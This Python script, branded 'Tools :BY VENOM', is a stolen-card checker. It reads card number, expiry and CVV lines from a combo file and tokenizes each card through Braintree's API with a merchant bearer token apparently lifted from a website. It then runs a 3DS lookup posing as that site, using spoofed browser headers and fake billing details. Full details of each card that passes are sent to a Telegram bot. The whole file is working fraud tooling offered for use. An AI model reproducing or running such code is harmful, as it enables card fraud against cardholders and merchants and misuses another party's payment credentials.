import requests, time, webbrowser, json, os, sys
from cfonts import render, say
import random, string, user_agent, telebot
from fake_useragent import UserAgent

user = user_agent.generate_user_agent()
r = requests.session()
r.follow_redirects = True
r.verify = False

Z = '\033[1;31m'
F = '\033[2;32m'
B = '\033[2;36m'
X = '\033[1;33m'
C = '\033[2;35m'

def to(s):
    for char in s + "\n":
        sys.stdout.write(char)
        sys.stdout.flush()
        time.sleep(23.0 / 8000)

to(f"""{F}{C}{F}
{F}{C}             [ Tools :BY VENOM ]""")

output = render('vbv', colors=['white', 'red'], align='center')
print(output)

ID = input('Enter Your ID : ')
token = input('Enter Your Token : ')
file = open('combo.txt', "+r")

start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3 = n[:6]
    mm = P.split('|')[1]
    if int(mm) in [10, 11, 12]:
        mm = mm
    elif '0' not in mm:
        mm = f'0{mm}'
    yy = P.split('|')[2]
    cvc = P.split('|')[3].replace('\n', '')
    P = P.replace('\n', '')
    if "20" not in yy:
        yy = f'20{yy}'

    # ================== [ STEP 1:VENOM Tokenize ] ================== #
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYzNTEyMDQsImp0aSI6ImZjZjg1ZGFhLTIxNmItNGZhOC1iNWFjLTZhMjVhYWY0MTdlMyIsInN1YiI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InBheXBhcmFhcnRjb20ifX0.i-GpGt1aSESilSyK7bKTJltEhPEPow35VUwpkJSTyzHkpqpUqbB6cLlAYvIFVx0EvOVZyBdhZlcaocaj2q9m9g',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'priority': 'u=1, i',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

    json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'custom',
        'sessionId': '030bb91b-9e72-4f02-97ec-ff946e41236b',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!, $authenticationInsightInput: AuthenticationInsightInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }     authenticationInsight(input: $authenticationInsightInput) {      customerAuthenticationRegulationEnvironment    }  } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': n,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
        'authenticationInsightInput': {
            'merchantAccountId': 'payparaartcom',
        },
    },
    'operationName': 'TokenizeCreditCard',
}

    response = requests.post(
        'https://payments.braintree-api.com/graphql',
        headers=headers,
        json=json_data
    )
    tok = (response.json()['data']['tokenizeCreditCard']['token'])

    # ================== [ STEP 2: VENOM 3DS Lookup ] ================== #
    headers = {
    'accept': '*/*',
    'accept-language': 'en-US,en;q=0.9',
    'content-type': 'application/json',
    'origin': 'https://3dmodels.org',
    'priority': 'u=1, i',
    'referer': 'https://3dmodels.org/',
    'sec-ch-ua': '"Not;A=Brand";v="99", "Google Chrome";v="139", "Chromium";v="139"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': user,
}

    json_data = {
    'amount': '228.00',
    'browserColorDepth': 24,
    'browserJavaEnabled': False,
    'browserJavascriptEnabled': True,
    'browserLanguage': 'en-US',
    'browserScreenHeight': 1024,
    'browserScreenWidth': 1280,
    'browserTimeZone': -180,
    'deviceChannel': 'Browser',
    'additionalInfo': {
        'ipAddress': '197.32.52.103',
        'billingPhoneNumber': '13342379842',
        'billingGivenName': '\u202aMohammed',
        'billingSurname': 'Saeed\u202c\u200f',
        'email': 'testbin180copra@gmail.com',
    },
    'bin': bin3,
    'dfReferenceId': '1_8eca3059-93c3-4f7e-8849-d6a3c5280975',
    'clientMetadata': {
        'requestedThreeDSecureVersion': '2',
        'sdkVersion': 'web/3.125.0',
        'cardinalDeviceDataCollectionTimeElapsed': 264,
        'issuerDeviceDataCollectionTimeElapsed': 5681,
        'issuerDeviceDataCollectionResult': True,
    },
    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3NTYzNTEyMDQsImp0aSI6ImZjZjg1ZGFhLTIxNmItNGZhOC1iNWFjLTZhMjVhYWY0MTdlMyIsInN1YiI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6Im5wMzZjMnRyNWR0bTM2Mm4iLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZSwidmVyaWZ5X3dhbGxldF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InBheXBhcmFhcnRjb20ifX0.i-GpGt1aSESilSyK7bKTJltEhPEPow35VUwpkJSTyzHkpqpUqbB6cLlAYvIFVx0EvOVZyBdhZlcaocaj2q9m9g',
    'braintreeLibraryVersion': 'braintree/web/3.125.0',
    '_meta': {
        'merchantAppId': '3dmodels.org',
        'platform': 'web',
        'sdkVersion': '3.125.0',
        'source': 'client',
        'integration': 'custom',
        'integrationType': 'custom',
        'sessionId': '030bb91b-9e72-4f02-97ec-ff946e41236b',
    },
}

    response = requests.post(
        f'https://api.braintreegateway.com/merchants/np36c2tr5dtm362n/client_api/v1/payment_methods/{tok}/three_d_secure/lookup',
        headers=headers,
        json=json_data
    )

    msg = response.json()["paymentMethod"]["threeDSecureInfo"]["status"]

    # ================== [ RESPONSE HANDLER ] ================== #
    if "authenticate_attempt_successful" in msg or "authenticate_successful" in msg:
        msg_text, status = "3DS Authenticate Successful ✅", "passed ✅"
        result_code = 1
        print(f'{F}[ {start_num} ]', P, ' ->  ✅ ' + msg)
        requests.post(
            f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text="
            f"𝗖𝗮𝗿𝗱 -» {n}|{mm}|{yy}|{cvc}\n\n"
            f"𝗚𝗮𝘁𝗲𝘄𝗮𝘆 -» 𝗕𝗿𝗮𝗶𝗻𝘁𝗿𝗲𝗲 𝗟𝗼𝗼𝗸𝘂𝗽\n\n"
            f"𝗥𝗲𝘀𝘂𝗹𝘁 -» {status}\n\n"
            f"𝗥𝗲𝘀𝗽𝗼𝗻𝘀𝗲 -» {msg_text}\n\n"
            f"~ 𝗕𝗬 : @i_2_8_w |"
        )

    elif "authenticate_rejected" in msg:
        print(f'{Z}[ {start_num} ]', P, ' ->  ❌ ' + msg)

    elif "lookup_error" in msg:
        print(f'{Z}[ {start_num} ]', P, ' ->  ❌ ' + msg)

    else:
        print(f'{X}[ {start_num} ]', P, ' -> ⚠️ New Response -> ' + msg)

    time.sleep(3)
